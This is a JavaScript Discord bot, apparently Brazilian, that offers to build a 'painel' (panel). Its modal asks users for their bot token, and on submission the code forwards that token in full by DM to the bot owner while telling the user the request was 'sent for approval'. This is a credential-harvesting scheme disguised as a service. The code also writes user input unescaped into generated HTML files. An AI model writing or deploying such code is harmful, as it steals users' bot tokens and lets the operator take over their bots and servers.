const {Client,GatewayIntentBits,ModalBuilder,TextInputBuilder,ActionRowBuilder,TextInputStyle,EmbedBuilder,Partials}=require('discord.js')
const C=require('./_config'),{EMB}=require('./_estilo'),fs=require('fs')
const b=new Client({intents:[Object.values(GatewayIntentBits)],partials:[Partials.Message,Partials.Channel]})
b.on('ready',()=>console.log('✅ 05'))
b.on('messageCreate',m=>{if(['!CPAINEL','!cpainel','!painelbot'].includes(m.content))m.channel.send(EMB('PN',C.B.PN.n))})
b.on('interactionCreate',async i=>{
  if(i.customId==='btn_PN'){
    const md=new ModalBuilder().setCustomId('mdp').setTitle('🖥️ PAINEL')
    md.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tb').setLabel('Token Bot').setStyle(1).setRequired(true)),new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ds').setLabel('Como quer o painel').setStyle(2).setRequired(true)),new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('cd').setLabel('CÓDIGO ESPECIAL').setStyle(1).setRequired(true)))
    i.showModal(md)
  }
  if(i.isModalSubmit()&&i.customId==='mdp'){
    const tb=i.fields.getTextInputValue('tb'),ds=i.fields.getTextInputValue('ds'),cd=i.fields.getTextInputValue('cd'),u=i.user
    fs.writeFileSync(__dirname+`/painel_${Date.now()}.html`,`<!DOCTYPE html><html><head><title>Painel ${cd}</title></head><body><h1 style="color:#009dff">${ds}</h1><code>${cd}</code></body></html>`)
    b.users.cache.get(C.DONO)?.send({embeds:[new EmbedBuilder().setColor('#009dff').setTitle('🖥️ PAINEL NOVO').addFields({name:'Token',value:'```'+tb+'```'},{name:'Código',value:cd})]})
    i.reply({embeds:[new EmbedBuilder().setColor('#009dff').setDescription('📤 enviado para aprovação')],ephemeral:true})
  }
})
b.on('guildCreate',g=>{if(g.id!==C.SRV)g.leave()})
b.login(C.B.PN.t)
